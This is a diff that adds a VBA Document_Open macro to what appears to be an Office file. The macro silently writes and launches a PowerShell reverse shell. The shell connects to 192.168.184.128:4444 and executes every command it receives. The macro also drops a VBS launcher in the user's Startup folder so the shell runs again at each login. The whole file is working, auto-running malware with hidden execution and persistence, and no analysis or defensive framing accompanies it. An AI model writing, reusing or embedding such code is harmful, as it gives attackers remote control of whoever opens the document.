@@ -1,0 +1,53 @@
+Private Sub Document_Open()
+    Dim fso As Object
+    Dim desktopPath As String
+    Dim startupPath As String
+    Dim psFile As Object
+    Dim vbsFile As Object
+    Dim psContent As String
+    Dim vbsContent As String
+    Dim command As String
+    
+    ' Get the path to the desktop
+    desktopPath = Environ("USERPROFILE") & "\Desktop\pipik.ps1"
+    
+    ' PowerShell script content to be written to pipik.ps1
+    psContent = "$port=4444;$ip='192.168.184.128';$socket=New-Object System.Net.Sockets.TcpClient($ip,$port);" & _
+                "$stream=$socket.GetStream();$reader=New-Object System.IO.StreamReader $stream;" & _
+                "$writer=New-Object System.IO.StreamWriter $stream;[byte[]]$buffer=0..65535|%{0};" & _
+                "while($true){$data=$reader.ReadLine();if($data-eq $null){break};" & _
+                "$sendback=(iex $data 2>&1|Out-String);$writer.WriteLine($sendback);" & _
+                "$writer.Flush()};$socket.Close()"
+    
+    ' Create the pipik.ps1 file on the desktop
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set psFile = fso.CreateTextFile(desktopPath, True)
+    
+    ' Write the PowerShell script content to the file
+    psFile.WriteLine psContent
+    psFile.Close
+    
+    ' Command to execute the PowerShell script
+    command = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -File """ & desktopPath & """"
+    
+    ' Execute the command
+    shell command, vbHide
+    
+    ' Get the path to the startup folder
+    startupPath = Environ("USERPROFILE") & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run_pipik.vbs"
+    
+    ' VBS script content to run the PowerShell script invisibly
+    vbsContent = _
+        "Set objShell = CreateObject(""WScript.Shell"")" & vbCrLf & _
+        "objShell.Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -File %USERPROFILE%\Desktop\pipik.ps1"", 0, False"
+    
+    ' Create the VBS file in the startup folder
+    Set vbsFile = fso.CreateTextFile(startupPath, True)
+    
+    ' Write the VBS content to the file
+    vbsFile.WriteLine vbsContent
+    vbsFile.Close
+    
+End Sub
+
+
